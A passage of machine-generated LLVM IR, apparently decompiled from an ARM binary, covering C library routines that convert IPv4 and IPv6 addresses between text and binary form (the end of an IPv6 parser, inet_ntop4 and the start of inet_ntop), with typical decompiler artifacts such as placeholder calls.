  %v2_194f412 = icmp eq i32 %v1_194f010, 0
  br i1 %v2_194f412, label %dec_label_pc_194fc, label %dec_label_pc_19420

dec_label_pc_19420:                               ; preds = %dec_label_pc_1940c, %dec_label_pc_194ec.backedge
  %v0_19424 = phi i32 [ %v1_194f0, %dec_label_pc_194ec.backedge ], [ %v1_194f010, %dec_label_pc_1940c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_194ec.backedge ], [ 0, %dec_label_pc_1940c ]
  store i32 ptrtoint ([17 x i8]* @global_var_20f74.1378 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_20f74.1378 to i32), i32* %r0.global-to-local, align 4
  %v3_1942c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_20f74.1378 to i32), i32 %v0_19424)
  %v4_1942c = trunc i32 %v3_1942c to i8
  store i32 %v3_1942c, i32* %r0.global-to-local, align 4
  %v3_19430 = icmp eq i8 %v4_1942c, 0
  %v0_19434 = load i32, i32* @r6, align 4
  %v1_19434 = add i32 %v0_19434, 1
  store i32 %v1_19434, i32* @r6, align 4
  br i1 %v3_19430, label %dec_label_pc_19450, label %dec_label_pc_1943c

dec_label_pc_1943c:                               ; preds = %dec_label_pc_19420
  %v0_1943c = load i32, i32* %sb.global-to-local, align 4
  %v2_1943c = sext i8 %v4_1942c to i32
  %v3_1943c = sub i32 %v2_1943c, %v0_1943c
  store i32 %v3_1943c, i32* %r3.global-to-local, align 4
  %v1_19440 = load i32, i32* %r7.global-to-local, align 4
  %v4_19440 = mul i32 %v1_19440, 16
  %v5_19440 = or i32 %v4_19440, %v3_1943c
  store i32 %v5_19440, i32* %r7.global-to-local, align 4
  %v3_19448 = icmp ult i32 %v5_19440, 65534
  br i1 %v3_19448, label %dec_label_pc_194e4, label %dec_label_pc_195a0

dec_label_pc_19450:                               ; preds = %dec_label_pc_19420
  %v0_19450 = load i32, i32* @r5, align 4
  %v7_19450 = icmp eq i32 %v0_19450, 58
  br i1 %v7_19450, label %dec_label_pc_19458, label %dec_label_pc_194b4

dec_label_pc_19458:                               ; preds = %dec_label_pc_19450
  %v4_194582 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_194582, i32* %r3.global-to-local, align 4
  %v2_1945c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1945c, label %dec_label_pc_19464, label %dec_label_pc_19478

dec_label_pc_19464:                               ; preds = %dec_label_pc_19458
  %v0_19464 = load i32, i32* %fp.global-to-local, align 4
  %v2_19464 = icmp eq i32 %v0_19464, 0
  br i1 %v2_19464, label %dec_label_pc_1946c, label %dec_label_pc_195a0

dec_label_pc_1946c:                               ; preds = %dec_label_pc_19464
  %v0_1946c = load i32, i32* @r4, align 4
  store i32 %v0_1946c, i32* %fp.global-to-local, align 4
  store i32 %v1_19434, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_194ec.backedge

dec_label_pc_19478:                               ; preds = %dec_label_pc_19458
  %v1_19478 = inttoptr i32 %v1_19434 to i8*
  %v2_19478 = load i8, i8* %v1_19478, align 1
  %v3_19478 = zext i8 %v2_19478 to i32
  store i32 %v3_19478, i32* %r3.global-to-local, align 4
  %v2_1947c = icmp eq i8 %v2_19478, 0
  br i1 %v2_1947c, label %dec_label_pc_195a0, label %dec_label_pc_19484

dec_label_pc_19484:                               ; preds = %dec_label_pc_19478
  %v0_19484 = load i32, i32* @r4, align 4
  %v1_19484 = add i32 %v0_19484, 2
  store i32 %v1_19484, i32* %r3.global-to-local, align 4
  %v1_19488 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_19484, %v1_19488
  br i1 %tmp38, label %dec_label_pc_195a0, label %dec_label_pc_19490

dec_label_pc_19490:                               ; preds = %dec_label_pc_19484
  %v0_19490 = load i32, i32* %r7.global-to-local, align 4
  %v3_19490 = udiv i32 %v0_19490, 256
  store i32 %v3_19490, i32* %r2.global-to-local, align 4
  store i32 %v0_19484, i32* %r3.global-to-local, align 4
  %v1_19498 = trunc i32 %v3_19490 to i8
  %v3_19498 = inttoptr i32 %v0_19484 to i8*
  store i8 %v1_19498, i8* %v3_19498, align 1
  %v4_19498 = load i32, i32* %r3.global-to-local, align 4
  %v5_19498 = add i32 %v4_19498, 1
  store i32 %v5_19498, i32* %r3.global-to-local, align 4
  %v0_1949c = load i32, i32* @r6, align 4
  store i32 %v0_1949c, i32* %sl.global-to-local, align 4
  %v0_194a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_194a0 = trunc i32 %v0_194a0 to i8
  %v2_194a0 = load i32, i32* @r4, align 4
  %v3_194a0 = add i32 %v2_194a0, 1
  %v4_194a0 = inttoptr i32 %v3_194a0 to i8*
  store i8 %v1_194a0, i8* %v4_194a0, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_194a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_194a8 = add i32 %v0_194a8, 1
  store i32 %v1_194a8, i32* @r4, align 4
  %v0_194ec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_194ec.backedge

dec_label_pc_194b4:                               ; preds = %dec_label_pc_19450
  %v7_194b4 = icmp eq i32 %v0_19450, 46
  br i1 %v7_194b4, label %dec_label_pc_194bc, label %dec_label_pc_195a0

dec_label_pc_194bc:                               ; preds = %dec_label_pc_194b4
  %v0_194bc = load i32, i32* @r4, align 4
  %v1_194bc = add i32 %v0_194bc, 4
  store i32 %v1_194bc, i32* @r5, align 4
  %v1_194c0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_194bc, %v1_194c0
  br i1 %tmp39, label %dec_label_pc_195a0, label %dec_label_pc_194c8

dec_label_pc_194c8:                               ; preds = %dec_label_pc_194bc
  %v0_194cc = load i32, i32* %sl.global-to-local, align 4
  %v1_194cc = inttoptr i32 %v0_194cc to i8*
  store i32 %v0_194cc, i32* %r0.global-to-local, align 4
  %v4_194d0 = call i32 @inet_pton4(i8* %v1_194cc, i32 %v0_194bc)
  store i32 %v4_194d0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_194d0, 1
  br i1 %tmp36, label %dec_label_pc_195a0, label %bb

bb:                                               ; preds = %dec_label_pc_194c8
  %v5_194d8 = load i32, i32* @r5, align 4
  store i32 %v5_194d8, i32* @r4, align 4
  br label %dec_label_pc_19528

dec_label_pc_194e4:                               ; preds = %dec_label_pc_1943c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_194ec.backedge

dec_label_pc_194ec.backedge:                      ; preds = %dec_label_pc_194e4, %dec_label_pc_1946c, %dec_label_pc_19490
  %v0_194ec = phi i32 [ %v1_19434, %dec_label_pc_1946c ], [ %v0_194ec.pre, %dec_label_pc_19490 ], [ %v1_19434, %dec_label_pc_194e4 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1946c ], [ 0, %dec_label_pc_19490 ], [ 1, %dec_label_pc_194e4 ]
  %v1_194ec = inttoptr i32 %v0_194ec to i8*
  %v2_194ec = load i8, i8* %v1_194ec, align 1
  %v3_194ec = zext i8 %v2_194ec to i32
  store i32 %v3_194ec, i32* %r0.global-to-local, align 4
  %v1_194f0 = call i32 @__GI_tolower(i32 %v3_194ec)
  store i32 %v1_194f0, i32* %r0.global-to-local, align 4
  store i32 %v1_194f0, i32* @r5, align 4
  %v2_194f4 = icmp eq i32 %v1_194f0, 0
  br i1 %v2_194f4, label %dec_label_pc_194fc, label %dec_label_pc_19420

dec_label_pc_194fc:                               ; preds = %dec_label_pc_194ec.backedge, %dec_label_pc_1940c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1940c ], [ %stack_var_-56.0.be, %dec_label_pc_194ec.backedge ]
  %v4_194fc3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_194fc3, i32* %r3.global-to-local, align 4
  %v2_19500 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1956c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_19500, label %dec_label_pc_19528, label %dec_label_pc_19508

dec_label_pc_19508:                               ; preds = %dec_label_pc_194fc
  %v1_19508 = add i32 %v0_1956c.pre.pre, 2
  store i32 %v1_19508, i32* %r3.global-to-local, align 4
  %v1_1950c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_19508, %v1_1950c
  br i1 %tmp40, label %dec_label_pc_195a0, label %dec_label_pc_19514

dec_label_pc_19514:                               ; preds = %dec_label_pc_19508
  store i32 %v0_1956c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_19518 = load i32, i32* %r7.global-to-local, align 4
  %v3_19518 = udiv i32 %v0_19518, 256
  store i32 %v3_19518, i32* %r2.global-to-local, align 4
  %v1_1951c = trunc i32 %v3_19518 to i8
  %v3_1951c = inttoptr i32 %v0_1956c.pre.pre to i8*
  store i8 %v1_1951c, i8* %v3_1951c, align 1
  %v4_1951c = load i32, i32* %r3.global-to-local, align 4
  %v5_1951c = add i32 %v4_1951c, 1
  store i32 %v5_1951c, i32* %r3.global-to-local, align 4
  %v0_19520 = load i32, i32* %r7.global-to-local, align 4
  %v1_19520 = trunc i32 %v0_19520 to i8
  %v2_19520 = load i32, i32* @r4, align 4
  %v3_19520 = add i32 %v2_19520, 1
  %v4_19520 = inttoptr i32 %v3_19520 to i8*
  store i8 %v1_19520, i8* %v4_19520, align 1
  %v0_19524 = load i32, i32* %r3.global-to-local, align 4
  %v1_19524 = add i32 %v0_19524, 1
  store i32 %v1_19524, i32* @r4, align 4
  br label %dec_label_pc_19528

dec_label_pc_19528:                               ; preds = %dec_label_pc_194fc, %bb, %dec_label_pc_19514
  %v0_1956c.pre = phi i32 [ %v5_194d8, %bb ], [ %v1_19524, %dec_label_pc_19514 ], [ %v0_1956c.pre.pre, %dec_label_pc_194fc ]
  %v0_19528 = load i32, i32* %fp.global-to-local, align 4
  %v2_19528 = icmp eq i32 %v0_19528, 0
  %v1_1956c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_19528, label %dec_label_pc_1956c, label %dec_label_pc_19530

dec_label_pc_19530:                               ; preds = %dec_label_pc_19528
  %v9_19530 = icmp eq i32 %v0_1956c.pre, %v1_1956c.pre
  %v2_19534 = sub i32 %v0_1956c.pre, %v0_19528
  store i32 %v2_19534, i32* %r0.global-to-local, align 4
  br i1 %v9_19530, label %dec_label_pc_195a0, label %dec_label_pc_19554.preheader

dec_label_pc_19554.preheader:                     ; preds = %dec_label_pc_19530
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19554

dec_label_pc_19544:                               ; preds = %dec_label_pc_19554
  %v0_19544 = load i32, i32* %fp.global-to-local, align 4
  %v2_19544 = add i32 %v0_19544, %v2_19558
  %v3_19544 = inttoptr i32 %v2_19544 to i8*
  %v4_19544 = load i8, i8* %v3_19544, align 1
  %v3_19548 = inttoptr i32 %v2_1955c to i8*
  store i8 %v4_19544, i8* %v3_19548, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_19550 = load i32, i32* %fp.global-to-local, align 4
  %v3_19550 = load i32, i32* %ip.global-to-local, align 4
  %v4_19550 = add i32 %v3_19550, %v2_19550
  %v5_19550 = inttoptr i32 %v4_19550 to i8*
  store i8 0, i8* %v5_19550, align 1
  %v0_19554.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19554.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1955c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19554

dec_label_pc_19554:                               ; preds = %dec_label_pc_19554.preheader, %dec_label_pc_19544
  %v0_19568 = phi i32 [ %v1_1956c.pre, %dec_label_pc_19554.preheader ], [ %v1_1955c.pre, %dec_label_pc_19544 ]
  %v1_19558 = phi i32 [ %v2_19534, %dec_label_pc_19554.preheader ], [ %v1_19554.pre, %dec_label_pc_19544 ]
  %v0_19560 = phi i32 [ 1, %dec_label_pc_19554.preheader ], [ %v0_19554.pre, %dec_label_pc_19544 ]
  %v2_19558 = sub i32 %v1_19558, %v0_19560
  store i32 %v2_19558, i32* %ip.global-to-local, align 4
  %v2_1955c = sub i32 %v0_19568, %v0_19560
  store i32 %v2_1955c, i32* @lr, align 4
  %v1_19560 = add i32 %v0_19560, 1
  store i32 %v1_19560, i32* %r2.global-to-local, align 4
  %v7_19564 = icmp slt i32 %v1_19558, %v0_19560
  br i1 %v7_19564, label %dec_label_pc_19568, label %dec_label_pc_19544

dec_label_pc_19568:                               ; preds = %dec_label_pc_19554
  store i32 %v0_19568, i32* @r4, align 4
  br label %dec_label_pc_1956c

dec_label_pc_1956c:                               ; preds = %dec_label_pc_19528, %dec_label_pc_19568
  %v0_1956c = phi i32 [ %v0_19568, %dec_label_pc_19568 ], [ %v0_1956c.pre, %dec_label_pc_19528 ]
  %v1_1956c = phi i32 [ %v0_19568, %dec_label_pc_19568 ], [ %v1_1956c.pre, %dec_label_pc_19528 ]
  %v9_1956c = icmp eq i32 %v0_1956c, %v1_1956c
  br i1 %v9_1956c, label %dec_label_pc_19574, label %dec_label_pc_195a0

dec_label_pc_19574:                               ; preds = %dec_label_pc_1956c
  store i32 16, i32* @r2, align 4
  %v2_19578 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_19578, i32* @r0, align 4
  store i32 %v2_193dc, i32* @r1, align 4
  %v0_19580 = call i32 @memcpy()
  store i32 %v0_19580, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195a4

dec_label_pc_1958c:                               ; preds = %dec_label_pc_193bc
  %v0_1958c = call i32 @__errno_location()
  store i32 %v0_1958c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19598 = inttoptr i32 %v0_1958c to i32*
  store i32 97, i32* %v2_19598, align 4
  %v0_195a4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195a4

dec_label_pc_195a0:                               ; preds = %dec_label_pc_1943c, %dec_label_pc_19464, %dec_label_pc_19484, %dec_label_pc_19478, %dec_label_pc_194c8, %dec_label_pc_19530, %dec_label_pc_194b4, %dec_label_pc_1956c, %dec_label_pc_19400, %dec_label_pc_19508, %dec_label_pc_194bc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195a4

dec_label_pc_195a4:                               ; preds = %dec_label_pc_1958c, %dec_label_pc_19574, %dec_label_pc_193c8, %dec_label_pc_195a0
  %v0_195a4 = phi i32 [ %v0_195a4.pre, %dec_label_pc_1958c ], [ 1, %dec_label_pc_19574 ], [ %v4_193d0, %dec_label_pc_193c8 ], [ 0, %dec_label_pc_195a0 ]
  store i32 %v0_195a4, i32* %r0.global-to-local, align 4
  store i32 %v3_193a4, i32* @r4, align 4
  store i32 %v6_193a4, i32* @r5, align 4
  store i32 %v9_193a4, i32* @r6, align 4
  ret i32 %v0_195a4

; uselistorder directives
  uselistorder i32 %v0_195a4, { 1, 0 }
  uselistorder i32 %v2_1955c, { 1, 0 }
  uselistorder i32 %v2_19558, { 1, 0 }
  uselistorder i32 %v0_19560, { 0, 1, 3, 2 }
  uselistorder i32 %v0_19568, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1956c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1956c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_19518, { 1, 0 }
  uselistorder i32 %v0_1956c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_194f0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_194cc, { 1, 0 }
  uselistorder i32 %v3_19490, { 1, 0 }
  uselistorder i32 %v0_19484, { 1, 0, 2 }
  uselistorder i32 %v1_19434, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1942c, { 1, 0 }
  uselistorder i32 %v0_19410, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 4, 0, 3, 22, 23, 21, 20, 18, 19, 17, 15, 16, 14, 11, 12, 13, 8, 9, 6, 7, 1, 2, 10, 5, 24, 25, 26, 27 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_195a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_195a0, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1956c, { 1, 0 }
  uselistorder label %dec_label_pc_19554, { 1, 0 }
  uselistorder label %dec_label_pc_19528, { 2, 0, 1 }
  uselistorder label %dec_label_pc_194ec.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19420, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_195b4 = load i32, i32* @r4, align 4
  store i32 %v3_195b4, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_20f60.1380 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_195d0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_195d0, i32* @r0, align 4
  %v0_195d4 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_195e4 = bitcast i32* %stack_var_-51 to i8*
  %v3_195e4 = call i32 @__GI_memset(i8* %v2_195e4, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_196ac = ptrtoint i32* %stack_var_-36 to i32
  %v2_19688 = add i32 %v2_196ac, -17
  br label %dec_label_pc_196ac

dec_label_pc_195f4:                               ; preds = %dec_label_pc_196ac
  %v0_195f4 = load i32, i32* %fp.global-to-local, align 4
  %v2_195f4 = add i32 %v0_195f4, %v1_195f4
  %v3_195f4 = inttoptr i32 %v2_195f4 to i8*
  %v4_195f4 = load i8, i8* %v3_195f4, align 1
  %v6_195f4 = zext i8 %v4_195f4 to i32
  store i32 %v6_195f4, i32* %r4.global-to-local, align 4
  %v1_195f8 = add i32 %v0_195f8, 1
  store i32 %v1_195f8, i32* %r7.global-to-local, align 4
  store i32 %v2_196ac, i32* %r2.global-to-local, align 4
  %v2_19604 = add i32 %v1_195f8, %v2_196ac
  store i32 %v2_19604, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_195f4, 100
  %v1_1960c = or i8 %div, 48
  %v3_19610 = add i32 %v2_196bc, -17
  %v4_19610 = inttoptr i32 %v3_19610 to i8*
  store i8 %v1_1960c, i8* %v4_19610, align 1
  %v0_19614 = load i32, i32* %r5.global-to-local, align 4
  %v1_19614 = add i32 %v0_19614, -17
  %v2_19614 = inttoptr i32 %v1_19614 to i8*
  %v3_19614 = load i8, i8* %v2_19614, align 1
  %v7_19618 = icmp eq i8 %v3_19614, 48
  %v0_1961c = load i32, i32* %fp.global-to-local, align 4
  %v1_1961c = load i32, i32* %r8.global-to-local, align 4
  %v2_1961c = add i32 %v1_1961c, %v0_1961c
  store i32 %v2_1961c, i32* %sb.global-to-local, align 4
  %v0_19624 = load i32, i32* %r4.global-to-local, align 4
  %v2_1962c = udiv i32 %v0_19624, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_19634 = urem i32 %v2_1962c, 256
  %v2_19638 = urem i32 %v1_19634, 10
  %v1_1963c = or i32 %v2_19638, 48
  %v1_19640 = trunc i32 %v1_1963c to i8
  br i1 %v7_19618, label %dec_label_pc_1962c, label %dec_label_pc_19654

dec_label_pc_1962c:                               ; preds = %dec_label_pc_195f4
  store i8 %v1_19640, i8* %v2_19614, align 1
  %v0_19644 = load i32, i32* %r5.global-to-local, align 4
  %v1_19644 = add i32 %v0_19644, -17
  %v2_19644 = inttoptr i32 %v1_19644 to i8*
  %v3_19644 = load i8, i8* %v2_19644, align 1
  %v7_19648 = icmp eq i8 %v3_19644, 48
  br i1 %v7_19648, label %dec_label_pc_1962c.dec_label_pc_19678_crit_edge, label %bb

dec_label_pc_1962c.dec_label_pc_19678_crit_edge:  ; preds = %dec_label_pc_1962c
  %v1_19688.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19678

bb:                                               ; preds = %dec_label_pc_1962c
  %v1_1964c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1964c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19678

dec_label_pc_19654:                               ; preds = %dec_label_pc_195f4
  %v2_19670 = load i32, i32* %sl.global-to-local, align 4
  %v3_19670 = add i32 %v2_19670, -17
  %v4_19670 = inttoptr i32 %v3_19670 to i8*
  store i8 %v1_19640, i8* %v4_19670, align 1
  %v0_19674 = load i32, i32* %r7.global-to-local, align 4
  %v1_19674 = add i32 %v0_19674, 1
  store i32 %v1_19674, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19678

dec_label_pc_19678:                               ; preds = %dec_label_pc_1962c.dec_label_pc_19678_crit_edge, %bb, %dec_label_pc_19654
  %v1_19688 = phi i32 [ %v1_19688.pre, %dec_label_pc_1962c.dec_label_pc_19678_crit_edge ], [ %v1_1964c, %bb ], [ %v1_19674, %dec_label_pc_19654 ]
  %v0_19678 = load i32, i32* %sb.global-to-local, align 4
  %v1_19678 = inttoptr i32 %v0_19678 to i8*
  %v2_19678 = load i8, i8* %v1_19678, align 1
  %tmp17 = urem i8 %v2_19678, 10
  store i32 %v2_196ac, i32* %ip.global-to-local, align 4
  %v1_1968c = add i32 %v1_19688, 1
  store i32 %v1_1968c, i32* %r1.global-to-local, align 4
  %v1_19690 = or i8 %tmp17, 48
  %v3_19694 = add i32 %v2_19688, %v1_19688
  %v4_19694 = inttoptr i32 %v3_19694 to i8*
  store i8 %v1_19690, i8* %v4_19694, align 1
  %v0_19698 = load i32, i32* %ip.global-to-local, align 4
  %v1_19698 = load i32, i32* %r1.global-to-local, align 4
  %v2_19698 = add i32 %v1_19698, %v0_19698
  store i32 %v2_19698, i32* %r2.global-to-local, align 4
  %v3_196a0 = add i32 %v2_19698, -17
  %v4_196a0 = inttoptr i32 %v3_196a0 to i8*
  store i8 46, i8* %v4_196a0, align 1
  %v0_196a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_196a4 = add i32 %v0_196a4, 1
  store i32 %v1_196a4, i32* %r8.global-to-local, align 4
  %v0_196a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_196a8 = add i32 %v0_196a8, 1
  br label %dec_label_pc_196ac

dec_label_pc_196ac:                               ; preds = %entry, %dec_label_pc_19678
  %v0_195f8 = phi i32 [ 0, %entry ], [ %v1_196a8, %dec_label_pc_19678 ]
  %v1_195f4 = phi i32 [ 0, %entry ], [ %v1_196a4, %dec_label_pc_19678 ]
  store i32 %v2_196ac, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_195f8, i32* %r6.global-to-local, align 4
  %v2_196bc = add i32 %v0_195f8, %v2_196ac
  store i32 %v2_196bc, i32* %r5.global-to-local, align 4
  %v7_196c0 = icmp sgt i32 %v1_195f4, 3
  br i1 %v7_196c0, label %dec_label_pc_196c4, label %dec_label_pc_195f4

dec_label_pc_196c4:                               ; preds = %dec_label_pc_196ac
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_195d0, i32* %r4.global-to-local, align 4
  %v3_196cc = add i32 %v2_196bc, -18
  %v4_196cc = inttoptr i32 %v3_196cc to i8*
  store i8 0, i8* %v4_196cc, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_196d4 = call i32 @strlen(i8* %tmp18)
  %v2_196d8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_196d4, %v2_196d8
  br i1 %tmp, label %dec_label_pc_196e4, label %dec_label_pc_196f8

dec_label_pc_196e4:                               ; preds = %dec_label_pc_196c4
  %v0_196e4 = call i32 @__errno_location()
  %v0_196ec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_196ec, i32* %r2.global-to-local, align 4
  %v2_196f0 = inttoptr i32 %v0_196e4 to i32*
  store i32 28, i32* %v2_196f0, align 4
  %v0_19708.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19708

dec_label_pc_196f8:                               ; preds = %dec_label_pc_196c4
  store i32 %v2_195d0, i32* %r1.global-to-local, align 4
  %v3_19700 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_19700, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19708

dec_label_pc_19708:                               ; preds = %dec_label_pc_196e4, %dec_label_pc_196f8
  %v0_19708 = phi i32 [ %v0_19708.pre, %dec_label_pc_196e4 ], [ %v3_19700, %dec_label_pc_196f8 ]
  %v2_19710 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19710, i32* @r4, align 4
  ret i32 %v0_19708

; uselistorder directives
  uselistorder i32 %v2_196bc, { 0, 2, 1 }
  uselistorder i32 %v1_195f4, { 1, 0 }
  uselistorder i32 %v0_195f8, { 0, 2, 1 }
  uselistorder i32 %v2_196ac, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_19708, { 1, 0 }
  uselistorder label %dec_label_pc_196ac, { 1, 0 }
  uselistorder label %dec_label_pc_19678, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19718 = load i32, i32* @r4, align 4
  store i32 %v3_19718, i32* %stack_var_-32, align 4
  %v6_19718 = load i32, i32* @r5, align 4
  %v25_19718 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1971c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1971c, label %dec_label_pc_19740, label %dec_label_pc_19734

dec_label_pc_19734:                               ; preds = %entry
  %v7_19734 = icmp eq i32 %arg1, 10
  br i1 %v7_19734, label %dec_label_pc_19754, label %dec_label_pc_19954

dec_label_pc_19740:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1974c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1994c

dec_label_pc_19754:                               ; preds = %dec_label_pc_19734
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_19760 = bitcast i32* %stack_var_-64 to i8*
  %v3_19760 = call i32 @__GI_memset(i8* %v2_19760, i32 0)
  br label %dec_label_pc_19780

dec_label_pc_1976c:                               ; preds = %dec_label_pc_19780
  %tmp68 = icmp slt i32 %v1_19770, 0
  %v4_19780 = zext i1 %tmp68 to i32
  %v5_19780 = add i32 %v4_19780, %v1_19770
  %v3_19784 = sdiv i32 %v5_19780, 2
  %v4_19794 = mul i32 %v3_19784, 4
  %v5_19794 = add i32 %v4_19794, %v25_19718
  %v1_1976c = add i32 %v2_19790, 1
